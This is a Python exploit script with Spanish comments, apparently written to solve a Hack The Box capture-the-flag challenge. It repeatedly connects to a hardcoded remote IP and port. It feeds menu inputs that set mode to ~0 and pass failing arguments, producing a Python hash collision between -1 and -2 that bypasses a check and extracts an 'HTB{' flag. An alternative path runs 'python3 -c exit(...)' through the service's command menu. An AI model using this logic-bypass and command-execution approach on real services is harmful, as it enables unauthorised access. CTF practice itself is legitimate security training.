#!/usr/bin/env python3

import socket
import time
import sys

def wait_for_server_and_exploit():
    """Esperar servidor y explotar inmediatamente"""
    
    host = "94.237.48.12"
    port = 54011
    
    print("=== CAZADOR FINAL DE FLAGS ===")
    print("Estrategia confirmada:")
    print("1. mode = ~0 (que es -1)")
    print("2. Comandos que fallen con returncode = 2 y returncode = 1")
    print("3. debug[0] = 2 * (-1) = -2")
    print("4. debug[1] = 1 * (-1) = -1")
    print("5. hash(-2) == hash(-1) == -2 ✓")
    print()
    
    while True:
        try:
            print("Intentando conectar...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, port))
            
            print("¡¡¡CONECTADO!!! Ejecutando explotación...")
            
            # Leer banner
            banner = s.recv(4096).decode('utf-8', errors='ignore')
            
            # Enviar configuración completa
            commands = [
                "1\n",                    # Seleccionar mode
                "~0\n",                   # mode = -1
                "2\n",                    # Seleccionar bin
                "ls\n",                   # bin = ls
                "3\n",                    # Seleccionar args
                "--invalid-option\n",     # args inválidos (returncode = 2)
                "4\n",                    # Seleccionar switches
                "/nonexistent\n",         # switches inválidos (returncode = 1)
                "5\n"                     # Ejecutar
            ]
            
            print("Enviando comandos...")
            for i, cmd in enumerate(commands):
                print(f"  {i+1}. Enviando: {repr(cmd.strip())}")
                s.send(cmd.encode())
                time.sleep(0.3)
            
            print("Esperando respuesta final...")
            time.sleep(2)
            
            # Leer respuesta final
            final_response = s.recv(8192).decode('utf-8', errors='ignore')
            
            print(f"Respuesta final ({len(final_response)} chars):")
            print("=" * 60)
            print(final_response)
            print("=" * 60)
            
            # Buscar flag
            all_data = banner + final_response
            if "What an awesome player!" in all_data:
                print("*** ¡¡¡CONDICIÓN DE VICTORIA CUMPLIDA!!! ***")
            
            if "HTB{" in all_data:
                start = all_data.find("HTB{")
                end = all_data.find("}", start) + 1
                if end > start:
                    flag = all_data[start:end]
                    print(f"🎉🎉🎉 ¡¡¡FLAG ENCONTRADA: {flag}!!! 🎉🎉🎉")
                    s.close()
                    return flag
            
            # Buscar cualquier indicio de victoria
            victory_indicators = ["awesome", "player", "win", "victory", "flag", "HTB"]
            for indicator in victory_indicators:
                if indicator.lower() in all_data.lower():
                    print(f"*** Indicador de victoria encontrado: '{indicator}' ***")
            
            s.close()
            
            print("No se encontró flag, reintentando en 5 segundos...")
            time.sleep(5)
            
        except socket.error as e:
            if "Connection refused" in str(e):
                print("Servidor no disponible, esperando 3 segundos...")
                time.sleep(3)
            else:
                print(f"Error de conexión: {e}")
                time.sleep(5)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

def test_alternative_strategy():
    """Probar estrategia alternativa con python3"""
    
    host = "94.237.48.12"
    port = 54011
    
    print("\n=== ESTRATEGIA ALTERNATIVA CON PYTHON3 ===")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect((host, port))
        
        print("¡Conectado! Probando estrategia python3...")
        
        # Leer banner
        banner = s.recv(4096).decode('utf-8', errors='ignore')
        
        # Configurar con python3
        commands = [
            "1\n",                    # Seleccionar mode
            "~0\n",                   # mode = -1
            "2\n",                    # Seleccionar bin
            "python3\n",              # bin = python3
            "3\n",                    # Seleccionar args
            "-c,exit(2)\n",           # args para returncode = 2
            "4\n",                    # Seleccionar switches
            "-c,exit(1)\n",           # switches para returncode = 1
            "5\n"                     # Ejecutar
        ]
        
        for cmd in commands:
            s.send(cmd.encode())
            time.sleep(0.3)
        
        time.sleep(2)
        
        # Leer respuesta
        final_response = s.recv(8192).decode('utf-8', errors='ignore')
        
        print(f"Respuesta python3 ({len(final_response)} chars):")
        print(final_response)
        
        # Buscar flag
        all_data = banner + final_response
        if "HTB{" in all_data:
            start = all_data.find("HTB{")
            end = all_data.find("}", start) + 1
            if end > start:
                flag = all_data[start:end]
                print(f"🎉🎉🎉 FLAG ENCONTRADA: {flag} 🎉🎉🎉")
                s.close()
                return flag
        
        s.close()
        
    except Exception as e:
        print(f"Error: {e}")
        return None

if __name__ == "__main__":
    print("Iniciando cazador final...")
    
    # Probar estrategia alternativa primero
    flag = test_alternative_strategy()
    if flag:
        print(f"¡FLAG ENCONTRADA: {flag}!")
        sys.exit(0)
    
    # Iniciar cazador principal
    wait_for_server_and_exploit()